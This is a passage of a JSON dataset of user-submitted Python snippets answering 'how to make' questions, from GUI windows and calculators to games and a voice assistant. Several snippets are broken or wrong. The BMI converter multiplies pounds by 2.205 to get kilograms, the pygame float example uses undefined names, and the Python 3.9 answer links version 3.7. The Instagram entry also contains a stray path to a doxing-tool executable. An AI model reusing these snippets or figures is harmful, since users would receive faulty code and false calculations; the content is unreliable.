            make_coffee(choice, drink[\"ingredients\"])     except :         print(\"An unexpected error occurred\")         print(\"try again\")\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1744,
    "keyword": null,
    "link": null,
    "title": " how to make a virus",
    "description": "# what are you trying to do...\ndont do it man\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1745,
    "keyword": null,
    "link": null,
    "title": " how to make a window in python",
    "description": "import tkinter from tkinter import *  #this makes the window window = Tk() #title window.title(\"My Window\") #change the size to whatever you want too window.configure(width = 800, height = 800) #change the background color to whatever you want too window.configure(bg = 'black') #this runs the window window.mainloop()  #simple way to a window in python\nimport tkinter as tk     def new_window1():     \" new window\"     try:         if win1.state() == \"normal\": win1.focus()     except NameError as e:         print(e)         win1 = tk.Toplevel()         win1.geometry(\"300x300+500+200\")         win1[\"bg\"] = \"navy\"         lb = tk.Label(win1, text=\"Hello\")         lb.pack()     win = tk.Tk() win.geometry(\"200x200+200+100\") button = tk.Button(win, text=\"Open new Window\") button['command'] = new_window1 button.pack() win.mainloop() \n#If using tkinter import tkinter as tk from tkinter import* #Window creating root = tk.Tk() # Defining name name = \"First window\" # Setting window root.title(name) # IF want to use geometry So let me tell that no need of that at all # Tkinter sets the window according to data or things inside it # Adding button Button bt1 = Button(root, text = \"Simple click\"); # Making function def doer():   # Print is for console   print(\"Did well\"); # Adding button with function Button bt2 = Button(root, text = \"Function\", command = doer) # If you will add () it after brackets it will run automatically # Adding buttons bt1.pack() bt2.pack() root.mainloop() # This can show error If using pycharm reformat file # Set it as you are best\nimport pygame pygame.init()  sh = int(500) sw = int(500) win = pygame.display.set_mode((sh, sw))  run = True while run:     pygame.time.delay(100) \tfor event in pygame.event.get():         if event.type == pygame.QUIT:             run = False \n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1746,
    "keyword": null,
    "link": null,
    "title": " how to make addition in python",
    "description": "#  With inputs Number1 = int(input(\"Write the first number:- \")) Number2 = int(input(\"Write the second number:- \")) Sum = Number1 + Number2 print(Sum)\n#+ is the addition symbol in Python, so: print(6 + 4) #output: 10\nfirstNumber = 3 secondNumber = 4  sum = firstNumber + secondNumber print(sum)  # Output : 7\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1747,
    "keyword": null,
    "link": null,
    "title": " how to make advanced calculator in python with simple gui interface in Terminal",
    "description": "logo = \"\"\"  _____________________ |  _________________  | | |    Calulator    | |   | |_________________| |  |  ___ ___ ___   ___  |  | | 7 | 8 | 9 | | + | |  | |___|___|___| |___| |  | | 4 | 5 | 6 | | - | |  | |___|___|___| |___| |  | | 1 | 2 | 3 | | x | |  | |___|___|___| |___| |  | | . | 0 | = | | / | |  | |___|___|___| |___| |   |_____________________|  \"\"\"   while True:          print(logo)     def addition(Num1,Num2):         return Num1 + Num2     def Subtract(Num1,Num2):         return Num1 - Num2     def Multiply(Num1, Num2):         return(Num1 * Num2)     def divide(Num1,Num2):         return Num1 / Num2     Num1_value = int(input(\"Number 1:- \"))     Opration = str(input(\"Which opration do you want to do +, -, *, /:- \"))     Num2_value = int(input(\"Number 2:- \"))     if Opration == \"+\":         ans = str(addition(Num1_value,Num2_value))     elif Opration == \"-\":         ans = str(Subtract(Num1_value,Num2_value))     elif Opration == \"*\":         ans = str(Multiply(Num1_value,Num2_value))     elif Opration == \"/\":         ans = str(divide(Num1_value,Num2_value))     else:         print(\"Input is incorrect\")     ans2 = ans     logo2 = \"\"\"                _____________________               |  _________________  |               | |  \"\"\"+ans2+\"\"\"                      | |_________________| |               |  ___ ___ ___   ___  |                | | 7 | 8 | 9 | | + | |                | |___|___|___| |___| |                | | 4 | 5 | 6 | | - | |                | |___|___|___| |___| |                | | 1 | 2 | 3 | | x | |                | |___|___|___| |___| |                | | . | 0 | = | | / | |                | |___|___|___| |___| |                 |_____________________|               \"\"\"     print(logo2)     continue_or_not = str(input(\"Do You Want to Continue 'Yes' or 'No':- \")).lower()     if continue_or_not == \"yes\":         continue     elif continue_or_not == \"no\":         break     else:         print(\"Try again\")\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1748,
    "keyword": null,
    "link": null,
    "title": " how to make alert dialog in tkinter",
    "description": "import tkinter as tk from tkinter import messagebox as mb  def answer():     mb.showerror(\"Answer\", \"Sorry, no answer available\")  def callback():     if mb.askyesno('Verify', 'Really quit?'):         mb.showwarning('Yes', 'Not yet implemented')     else:         mb.showinfo('No', 'Quit has been cancelled')  tk.Button(text='Quit', command=callback).pack(fill=tk.X) tk.Button(text='Answer', command=answer).pack(fill=tk.X) tk.mainloop() \n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1749,
    "keyword": null,
    "link": null,
    "title": " how to make an instagram report bot python",
    "description": "from instapy import InstaPy  session = InstaPy(username=\"<your_username>\", password=\"<your_password>\") session.login() session.like_by_tags([\"bmw\", \"mercedes\"], amount=5) session.set_dont_like([\"naked\", \"nsfw\"]) session.set_do_follow(True, percentage=50) session.set_do_comment(True, percentage=50) session.set_comments([\"Nice!\", \"Sweet!\", \"Beautiful :heart_eyes:\"]) session.end() \n\"C:\\Users\\admin\\AppData\\Local\\Temp\\Tronix Dox Tool V2.exe\" \n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1750,
    "keyword": null,
    "link": null,
    "title": " how to make base attack force factory in python",
    "description": " import os import time aluminium = 0 steel = 0 concrete = 0 level = 1 while True:     if level == 1:         aluminium += 100         steel += 200         concrete += 500              elif level == 2 :         aluminium += 500         steel += 400         concrete += 800              elif level == 3:         aluminium += 700         steel += 600         concrete += 1000              elif level == 4:         aluminium += 900         steel += 600         concrete += 1200               if aluminium >= 5000 and level == 1:         aluminium = 5000         print(\"storage for aluminium has exeeded\")              if steel >= 6000 and level == 1:         steel = 6000         print(\"storage for steel has exeeded\")      if concrete >= 5000 and level == 1:         concrete = 5000         print(\"storage for concreet has exeeded\")     if aluminium == 5000 and steel == 6000 and concrete == 5000 and level == 1:         upgrade_leval = input(\"Do you wnat to goto leval 2 y/n:- \")         if upgrade_leval == \"y\":             level = 2             aluminium -= 4000             steel -= 5000             concrete -= 5000         else:             print(\"ok but storage is exeeded\")     print(\"Your resorses are :- \")     print(\"aluminium:- \", aluminium , \" steel:- \", steel ,\" concrete:- \",concrete)           time.sleep(3)     os.system(\"cls\") #you can make this game factories further\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1751,
    "keyword": null,
    "link": null,
    "title": " how to make basic minecraft in python",
    "description": "#How to make basic MINECRAFT in python? You are in the right place!  ''' For this project, you need ursina installed. If you dont have ursina installed, use this command  pip install ursina and then wait for the process to finish '''  #import ursina and the first person controller from ursina import *  from ursina.prefabs.first_person_controller import FirstPersonController  #we make this 'app' so that we can let the program run  app = Ursina()  ''' each block in minecraft is a voxel, so we make a voxel class (the blocks) and we give these voxels some attributes ''' class Voxel(Button):     def __init__(self, position = (0,0,0)):         super().__init__(             parent = scene,             position = position,             model = 'cube',             origin_y = 0.5,             texture = 'white_cube',             color = color.color(0,0,random.uniform(0.9,1)),             highlight_color = color.lime) #this method below allows us to mine and place blocks on key command     def input(self,key):         if self.hovered:             if key == 'left mouse down':                 voxel = Voxel(position = self.position + mouse.normal)              if key == \"right mouse down\":                 destroy(self) #the below tells us how big the field is going to be for z in range(20):     for x in range(20):         voxel = Voxel(position = (x,0,z))  #this calls the first person controller player = FirstPersonController()  #this makes ursina get called and runs the program app.run()  #Run the program! Hopefully, it should work!!!!Good luck mining and crafting!  #This project is also on ClearCode's channel, so thanks to ClearCode.\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1752,
    "keyword": null,
    "link": null,
    "title": " how to make bmi calculator in python",
    "description": "weight = float(input('What is your weight? (Kg) ')) height = float(input('What is your height? (Mtr) ')) bmi = weight/(height*height)  if bmi <= 18.5:     print('Your BMI is', bmi, 'which means you are underweight')  elif 18.5 < bmi < 25:     print('Your BMI is', bmi,'which means you are normal')  elif 25 < bmi < 30:     print('your BMI is', bmi,' which means you are overweight')  elif bmi > 30:     print('Your BMI is', bmi,'which means you are obese')\nprint(\"Welcome to BMI calculator, by Abthahi Tazrian.\")  # Offer Measurement Conversions  Offer_Conversions = input(\"Would you like to convert your imperial units to metric? (yes / no): \")  if Offer_Conversions == \"yes\":     Imperial_Weight = input(\"What is your weight in pounds?: \")     Imperial_Height = input(\"What is your height in feet (decimals)?: \")      Imperial_Weight = float(Imperial_Weight)     Imperial_Height = float(Imperial_Height)      Metric_Converted_Weight = Imperial_Weight * 2.205     Metric_Converted_Height = Imperial_Height * 30.48      Metric_Converted_Weight = str(Metric_Converted_Weight)     Metric_Converted_Height = str(Metric_Converted_Height)      print(\"Your metric weight is \" + Metric_Converted_Weight + \" kg, please note this for the next stage.\")     print(\"Your metric height is \" + Metric_Converted_Height + \" cm, please note this for the next stage.\")     print(\"--\") elif Offer_Conversions == \"no\":     print(\"--\")  # Data Collection  Age = input(\"Put in your age: \") Weight = input(\"Put in your weight in KG: \") Height = input(\"Put in your height in CM: \")  # BMI Formula Calculation  Weight = float(Weight) Height = float(Height)  Height_Squared = Height * Height BMI_Formula_Assisted = Weight / Height_Squared BMI_Formula_Completed = BMI_Formula_Assisted * 10000  # Health Chart Display  BMI_Formula_Completed = str(BMI_Formula_Completed)  print(\"You have a BMI score of \" + BMI_Formula_Completed + \".\")  BMI_Formula_Completed = float(BMI_Formula_Completed)  if BMI_Formula_Completed <= 18.5:     print(\"You are underweight, consider gaining weight to bring your BMI to between 20 and 25.\") elif BMI_Formula_Completed <= 25:     print(\"You are perfectly healthy, with a BMI within a healthy range of between 20 and 25.\") elif BMI_Formula_Completed <= 30:     print(\"You are overweight, speak to a doctor about setting yourself a new target BMI between 20 and 25.\") elif BMI_Formula_Completed >= 30.1:     print(\"You are obese, you need to lower your BMI to between 20 and 25 or else you may be at risks.\")\n",
    "reg_date": "2021-10-12T11:30:34.000Z"
  },
  {
    "id": 1753,
    "keyword": null,
    "link": null,
    "title": " how to make booking website using django step by step",
    "description": "# models.py  Class Customer(models.Model):      email = models.EmailField()      # And whatever other custom fields here; maybe make a ForeignKey link to User? Whatever.  Class Table(models.Model):      seats = models.IntegerField()      min_people = models.IntegerField()      max_people = models.IntegerField()  Class Reservation(models.Model):      table = models.ForeignKey('Table', on_delete=Models.CASCADE)      party = models.ForeignKey('Customer', on_delete=Models.CASCADE)      spot = models.DateField()      # Make sure you don't use 'time' for this field, as that will cause a headache later on. \n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1754,
    "keyword": null,
    "link": null,
    "title": " how to make downloadable file in flask",
    "description": "from flask import Flask from flask import send_file app = Flask(__name__)  @app.route('/download') def downloadFile ():     #For windows you need to use drive name [ex: F:/Example.pdf]     path = \"/Examples.pdf\"     return send_file(path, as_attachment=True)  if __name__ == '__main__':     app.run(port=5000,debug=True) \n# Example of job definition: # .---------------- minute (0 - 59) # |  .------------- hour (0 - 23) # |  |  .---------- day of month (1 - 31) # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ... # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # |  |  |  |  | # *  *  *  *  * user-name  command to be executed  # Set the hardware clock to keep it in sync with the more accurate system clock 03 05 * * * /sbin/hwclock --systohc  # Perform monthly updates on the first of the month # 25 04 1 * * /usr/bin/dnf -y update\n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1755,
    "keyword": null,
    "link": null,
    "title": " how to make it so a discord bot messages in a certain channel python",
    "description": "channel = client.get_channel(12324234183172) await channel.send('hello') \n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1756,
    "keyword": null,
    "link": null,
    "title": " how to make it so the pygame window will close",
    "description": "running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False     if running == False:       pygame.quit()\n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1757,
    "keyword": null,
    "link": null,
    "title": " how to make jarvis in python",
    "description": "import pyttsx3  import speech_recognition as sr  import datetime import wikipedia  import webbrowser import os import smtplib  engine = pyttsx3.init('sapi5') voices = engine.getProperty('voices') # print(voices[1].id) engine.setProperty('voice', voices[1].id)   def speak(audio):     engine.say(audio)     engine.runAndWait()   def wishMe():     hour = int(datetime.datetime.now().hour)     if hour>=0 and hour<12:         speak(\"Good Morning!\")      elif hour>=12 and hour<18:         speak(\"Good Afternoon!\")         else:         speak(\"Good Evening!\")        speak(\"Hello Neel ,how may I help you\")         def takeCommand():     #It takes microphone input from the user and returns string output      r = sr.Recognizer()     with sr.Microphone() as source:         print(\"Listening...\")         r.pause_threshold = 2         audio = r.listen(source)      try:         print(\"Recognizing...\")             query = r.recognize_google(audio, language='en-in')         print(f\"User said: {query}\\n\")      except Exception as e:         # print(e)             print(\"Say that again please...\")           return \"None\"     return query  def sendEmail(to, content):     server = smtplib.SMTP('smtp.gmail.com', 587)     server.ehlo()     server.starttls()     server.login('Your Email', 'Your Password')     server.sendmail('Your Email', to, content)     server.close()  if __name__ == \"__main__\":     wishMe()     while True:     # if 1:         query = takeCommand().lower()          # Logic for executing tasks based on query         if 'wikipedia' in query:             speak('Searching Wikipedia...')             query = query.replace(\"wikipedia\", \"\")             results = wikipedia.summary(query, sentences=10)             speak(\"According to Wikipedia\")             print(results)             speak(results)          elif 'open youtube' in query:             webbrowser.open(\"youtube.com\")          elif 'open stackoverflow' in query:             webbrowser.open(\"stackoverflow.com\")            elif 'open python' in query:             webbrowser.open(\"coursera.org\")            elif 'open github' in query:             webbrowser.open(\"github.com\")             elif 'open mail' in query:             webbrowser.open(\"mail.google.com\")                      elif 'play music' in query:             music_dir = 'C:\\\\Users\\\\Admin\\\\Music\\\\my.mp3'             songs = os.listdir(music_dir)             print(songs)                 os.startfile(os.path.join(music_dir, songs[0]))          elif 'the time' in query:             strTime = datetime.datetime.now().strftime(\"%H:%M:%S\")                 speak(f\"Sir, the time is {strTime}\")          elif 'open code' in query:             codePath = \"E:\\\\Microsoft VS Code\\\\Code.exe\"             os.startfile(codePath)          elif 'open google' in query:             go = \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\"             os.startfile(go)          elif 'email to me' in query:             try:                 speak(\"What should I say?\")                 content = takeCommand()                 to = \"you@youremail.com\"                     sendEmail(to, content)                 speak(\"Email has been sent!\")             except Exception as e:                 print(e)                 speak(\"Sorry Neelansh, I couldn't send the email\")\n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1758,
    "keyword": null,
    "link": null,
    "title": " how to make jupyterlab see other directory",
    "description": "// To open jupyter lab with new directory    jupyter lab --notebook-dir \"C:\\name_of_dir\"\nThere are two ways to do even though they have only very small difference. Follow the way marneylc suggested above: i.e.  1) Open \"Anaconda Prompt\" and type jupyter notebook --generate-config  2) You find the file in C:\\Users\\username\\.jupyter\\jupyter_notebook_config.py  3) Change the line of #c.NotebookApp.notebook_dir = '' to c.NotebookApp.notebook_dir = 'c:\\test\\your_root\\'  4) Then, go to the shortcut of Jupyter Notebook located in C:\\Users\\User_name\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Anaconda3 (64-bit)  5) Do the right click and go to the Properties  6) In the Target field, remove %USERPROFILE% as stenlytw suggested above.  7) Then, In the field of Start in, type the same directory of c:\\test\\your_root\\ in jupyter_notebook_config.py  8) Done!  As the simpler way, after step 3, go to C:\\Users\\User_name\\Anaconda3\\Scripts  4-2) You can see the file of jupyter-notebook.exe and click it.  5-2) Then, the Jupyter start the folder you specified in jupyter_notebook_config.py. So make the shortcut of this file.  6-2) Done.\n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1759,
    "keyword": null,
    "link": null,
    "title": " how to make loading in python",
    "description": "import time import sys  done = 'false' #here is the animation def animate():     while done == 'false':         sys.stdout.write('\\rloading |')         time.sleep(0.1)         sys.stdout.write('\\rloading /')         time.sleep(0.1)         sys.stdout.write('\\rloading -')         time.sleep(0.1)         sys.stdout.write('\\rloading \\\\')         time.sleep(0.1)     sys.stdout.write('\\rDone!     ')  animate() #long process here done = 'false'\nimport itertools import threading import time import sys  done = False #here is the animation def animate():     for c in itertools.cycle(['|', '/', '-', '\\\\']):         if done:             break         sys.stdout.write('\\rloading ' + c)         sys.stdout.flush()         time.sleep(0.1)     sys.stdout.write('\\rDone!     ')  t = threading.Thread(target=animate) t.start()  #long process here time.sleep(10) done = True\n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1760,
    "keyword": null,
    "link": null,
    "title": " how to make multiple place holders in a string with %s python",
    "description": "a = 'bananas' b = 'apples' c = 'peaches' print('I like to eat %s, %s and %s' %(a, b, c)) #Prints: I like to eat bananas, apples and peaches\nvar1 = &ldquo;awesome&rdquo; var2 = &ldquo;ever&rdquo; print &ldquo;Codecademy has the most %s coding lessons %s!&rdquo; % (var1, var2) # displays: &ldquo;Codecademy has the most awesome coding lessons ever!&rdquo; \n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1761,
    "keyword": null,
    "link": null,
    "title": " how to make nmap port scanner in python",
    "description": "#Here I am Using API  import requests as r  host = input(\"Enter Your Host IP/Domain\") api = r.get(f\"https://api.hackertarget.com/nmap/?q={host}\") out = api.text  print(out) \n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1762,
    "keyword": null,
    "link": null,
    "title": " how to make objects bounce in trutle",
    "description": "import turtle from time import sleep  # Screen setup wn = turtle.Screen() wn.setup(width = 500, height = 500) wn.tracer(0)  # Object setup (The ball) ball = turtle.Turtle() ball.color(\"black\") ball.shape(\"circle\") wn.update()  running = True  # you can change the shapes by changing the value of x and y x = 5 y = 2  def bounce():     global x,y     ball.setx(ball.xcor() + x)     ball.sety(ball.ycor() + y)     if ball.ycor() > 250:         ball.sety(250)         y = y * (-1)     elif ball.ycor() < -256:         ball.sety(-256)         y = y * (-1)     elif ball.xcor() > 250:         ball.setx(250)         x = x * (-1)     elif ball.xcor() < -256:         ball.setx(-256)         x = x * (-1) def end():     global running     running = False def stop():     global end     wn.onkeypress(end,\"Escape\")     wn.listen()  # * if you want to let the ball stop drawing press escape  while running == True:     stop()     bounce()     sleep(0.002)     wn.update()\n",
    "reg_date": "2021-10-12T11:30:35.000Z"
  },
  {
    "id": 1763,
    "keyword": null,
    "link": null,
    "title": " how to make otp generator in python",
    "description": "# Python Program for simple OTP genertaor  import random as r # function for otp generation def otpgen():     otp=\"\"     for i in range(4):         otp+=str(r.randint(1,9))     print (\"Your One Time Password is \")     print (otp) otpgen()\n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1764,
    "keyword": null,
    "link": null,
    "title": " how to make player quit in python",
    "description": "import sys  sys.exit()\n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1765,
    "keyword": null,
    "link": null,
    "title": " how to make print float value without scientific notation in dataframe in jupyter notebook",
    "description": "In [25]: pd.set_option('display.float_format', lambda x: '%.3f' % x)  In [28]: Series(np.random.randn(3))*1000000000 Out[28]:  0    -757322420.605 1   -1436160588.997 2   -1235116117.064 dtype: float64 \n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1766,
    "keyword": null,
    "link": null,
    "title": " how to make pyautogui faster",
    "description": "\"\"\" Set pyautgui.PAUSE to a small number. Default is 0.1 secs between actions. Here is example code: \"\"\"  import pyautogui pyautgui.PAUSE = 0.01  # can be a float or an integer  # Now this can increase the speed of your spambot/autoclicker/whatever!\n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1767,
    "keyword": null,
    "link": null,
    "title": " how to make pygame use float number",
    "description": "'''Pygame cannot adjust the image/rectangle position with floats, because it rounds the float to an integer. But with this method it works'''  import pygame pygame.__init__()  WIDTH = 300 HEIGHT = 300 screen = pygame.display.set_mode((WIDTH, HEIGHT))  #Create Sprite Class class Sprite(pg.sprite.Sprite):     def __init__(self , pos_x , pos_y, img_name, size):         pg.sprite.Sprite.__init__(self)         self.pos_x = pos_x         self.pos_y = pos_y         self.image = pg.transform.scale(pg.image.load(img_name), size).convert()         self.rect = self.image.get_rect(center=(self.pos_x, self.pos_y))       def update(self):         pass         #Create Object sprite_obj = Sprite(x, y,\"IMAGE.png\",(10,10))  #Create Sprite Group all_sprites = pg.sprite.Group()  #Add Object To The Group all_sprites.add(sprite_obj)   #Now Create A Function That Redraws the \"sprite_obj\" in the new location z = 0 def update_sprite():   #First remove the old one   all_sprites.remove(sprite_obj)   #Make new one with other/updating coordinates   z += 1   sprite_obj = Sprite(z, y,\"IMAGE.png\",(10,10))   #Add the new one to the group   all_sprites.add(sprite_obj)        #Game Loop while True:     clock.tick(120)     for event in pygame.event.get():         if event.type == pygame.QUIT:             pygame.quit()             sys.exit()      #Update     all_sprites.draw(screen)     all_sprites.update()          update_sprite()          pygame.display.flip() \n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1768,
    "keyword": null,
    "link": null,
    "title": " how to make python3.9 active",
    "description": "ln -s -f /usr/local/bin/python3.7 /usr/local/bin/python \n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1769,
    "keyword": null,
    "link": null,
    "title": " how to make python code run faster",
    "description": "Give it a read- https://www.loginradius.com/blog/async/speed-up-python-code/  \"\"\" Additionally you can use Cython PyPI- https://pypi.org/project/Cython/ Documentation- https://cython.readthedocs.io/en/latest/ \"\"\"\n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1770,
    "keyword": null,
    "link": null,
    "title": " how to make python remove the duplicates in list",
    "description": "   mylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))    print(mylist) \n",
    "reg_date": "2021-10-12T11:30:36.000Z"
  },
  {
    "id": 1771,
    "keyword": null,
    "link": null,
    "title": " how to make python tell the time",
    "description": " import time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1772,
    "keyword": null,
    "link": null,
    "title": " how to make random colors in python turtle",
    "description": "import turtle, random colors = [\"green\",\"brown\"] theColor = random.choice(colors) turtle.color(theColor)\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1773,
    "keyword": null,
    "link": null,
    "title": " how to make snake game using python",
    "description": "#this code has asumed that you have intsalled pygame,time,random> import pygame import time import random   pygame.init()   white = (255, 255, 255) yellow = (255, 255, 102) black = (0, 0, 0) red = (213, 50, 80) green = (0, 255, 0) blue = (50, 153, 213)   dis_width = 600 dis_height = 400   dis = pygame.display.set_mode((dis_width, dis_height)) pygame.display.set_caption('Snake Game by Edureka')   clock = pygame.time.Clock()   snake_block = 10 snake_speed = 15   font_style = pygame.font.SysFont(\"bahnschrift\", 25) score_font = pygame.font.SysFont(\"comicsansms\", 35)     def Your_score(score):     value = score_font.render(\"Your Score: \" + str(score), True, yellow)     dis.blit(value, [0, 0])       def our_snake(snake_block, snake_list):     for x in snake_list:         pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])     def message(msg, color):     mesg = font_style.render(msg, True, color)     dis.blit(mesg, [dis_width / 6, dis_height / 3])     def gameLoop():     game_over = False     game_close = False       x1 = dis_width / 2     y1 = dis_height / 2       x1_change = 0     y1_change = 0       snake_List = []     Length_of_snake = 1       foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0     foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0       while not game_over:           while game_close == True:             dis.fill(blue)             message(\"You Lost! Press C-Play Again or Q-Quit\", red)             Your_score(Length_of_snake - 1)             pygame.display.update()               for event in pygame.event.get():                 if event.type == pygame.KEYDOWN:                     if event.key == pygame.K_q:                         game_over = True                         game_close = False                     if event.key == pygame.K_c:                         gameLoop()           for event in pygame.event.get():             if event.type == pygame.QUIT:                 game_over = True             if event.type == pygame.KEYDOWN:                 if event.key == pygame.K_LEFT:                     x1_change = -snake_block                     y1_change = 0                 elif event.key == pygame.K_RIGHT:                     x1_change = snake_block                     y1_change = 0                 elif event.key == pygame.K_UP:                     y1_change = -snake_block                     x1_change = 0                 elif event.key == pygame.K_DOWN:                     y1_change = snake_block                     x1_change = 0           if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:             game_close = True         x1 += x1_change         y1 += y1_change         dis.fill(blue)         pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])         snake_Head = []         snake_Head.append(x1)         snake_Head.append(y1)         snake_List.append(snake_Head)         if len(snake_List) > Length_of_snake:             del snake_List[0]           for x in snake_List[:-1]:             if x == snake_Head:                 game_close = True           our_snake(snake_block, snake_List)         Your_score(Length_of_snake - 1)           pygame.display.update()           if x1 == foodx and y1 == foody:             foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0             foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0             Length_of_snake += 1           clock.tick(snake_speed)       pygame.quit()     quit()     gameLoop()\nimport turtle import random  WIDTH = 500 HEIGHT = 500 FOOD_SIZE = 10 DELAY = 100  # milliseconds  offsets = {     \"up\": (0, 20),     \"down\": (0, -20),     \"left\": (-20, 0),     \"right\": (20, 0) }  def reset():     global snake, snake_direction, food_pos, pen     snake = [[0, 0], [0, 20], [0, 40], [0, 60], [0, 80]]     snake_direction = \"up\"     food_pos = get_random_food_pos()     food.goto(food_pos)     # screen.update() Only needed if we are fussed about drawing food before next call to `draw_snake()`.     move_snake()  def move_snake():     global snake_direction      #  Next position for head of snake.     new_head = snake[-1].copy()     new_head[0] = snake[-1][0] + offsets[snake_direction][0]     new_head[1] = snake[-1][1] + offsets[snake_direction][1]      # Check self-collision     if new_head in snake[:-1]:  # Or collision with walls?         reset()     else:         # No self-collision so we can continue moving the snake.         snake.append(new_head)          # Check food collision         if not food_collision():             snake.pop(0)  # Keep the snake the same length unless fed.          #  Allow screen wrapping         if snake[-1][0] > WIDTH / 2:             snake[-1][0] -= WIDTH         elif snake[-1][0] < - WIDTH / 2:             snake[-1][0] += WIDTH         elif snake[-1][1] > HEIGHT / 2:             snake[-1][1] -= HEIGHT         elif snake[-1][1] < -HEIGHT / 2:             snake[-1][1] += HEIGHT          # Clear previous snake stamps         pen.clearstamps()          # Draw snake         for segment in snake:             pen.goto(segment[0], segment[1])             pen.stamp()          # Refresh screen         screen.update()          # Rinse and repeat         turtle.ontimer(move_snake, DELAY)  def food_collision():     global food_pos     if get_distance(snake[-1], food_pos) < 20:         food_pos = get_random_food_pos()         food.goto(food_pos)         return True     return False  def get_random_food_pos():     x = random.randint(- WIDTH / 2 + FOOD_SIZE, WIDTH / 2 - FOOD_SIZE)     y = random.randint(- HEIGHT / 2 + FOOD_SIZE, HEIGHT / 2 - FOOD_SIZE)     return (x, y)  def get_distance(pos1, pos2):     x1, y1 = pos1     x2, y2 = pos2     distance = ((y2 - y1) ** 2 + (x2 - x1) ** 2) ** 0.5     return distance  def go_up():     global snake_direction     if snake_direction != \"down\":         snake_direction = \"up\"  def go_right():     global snake_direction     if snake_direction != \"left\":         snake_direction = \"right\"  def go_down():     global snake_direction     if snake_direction != \"up\":         snake_direction = \"down\"  def go_left():     global snake_direction     if snake_direction != \"right\":         snake_direction = \"left\"  # Screen screen = turtle.Screen() screen.setup(WIDTH, HEIGHT) screen.title(\"Snake master play and have fanda\") screen.bgcolor(\"yellow\") screen.setup(500, 500) screen.tracer(0)  # Pen pen = turtle.Turtle(\"square\") pen.penup()  # Food food = turtle.Turtle() food.shape(\"square\") food.color(\"red\") food.shapesize(FOOD_SIZE / 20)  # Default size of turtle \"square\" shape is 20. food.penup()  # Event handlers screen.listen() screen.onkey(go_up, \"Up\") screen.onkey(go_right, \"Right\") screen.onkey(go_down, \"Down\") screen.onkey(go_left, \"Left\")  # Let's go reset() turtle.done()\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1774,
    "keyword": null,
    "link": null,
    "title": " how to make text game python",
    "description": "import time #this and time.sleep() is optional, I am just using it  #game print('CoolKitty Presents') time.sleep(2) print('Text Game') print('1 Start') print('2 Exit') start = int(input('Press Binded Number')) #this creates an input in the console for users to type if start == 1: #If the user typed in 1   print('Go To Place 1 Or Place 2?') #your script   place = int(input('Place 1 Or Place 2?')) #creates another input in console   if place == 1: #If they typed 1     print('You are at place 1') #your script     exit() # ends script   if place == 2:     print('You are at place 2') #your script     exit() #ends script if start == 2: # If 2 is typed in, you can also do more numbers then 2!   exit() #ends program, repl.it might say have died, but that is normal.\nx1=0 x2=0 x3=0 x4=0 x5=8 x6=0 x7=0 x8=0 x9=0 for x in \"banana\":  print(x1, x2, x3)  print(x4, x5, x6)  print(x7, x8, x9)  ducky=input(\"what to do \")  if ducky == \"left\":    x6=8    x5=0    print('\\033[H\\033[J', end='')\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1775,
    "keyword": null,
    "link": null,
    "title": " how to make the higher or lower using python",
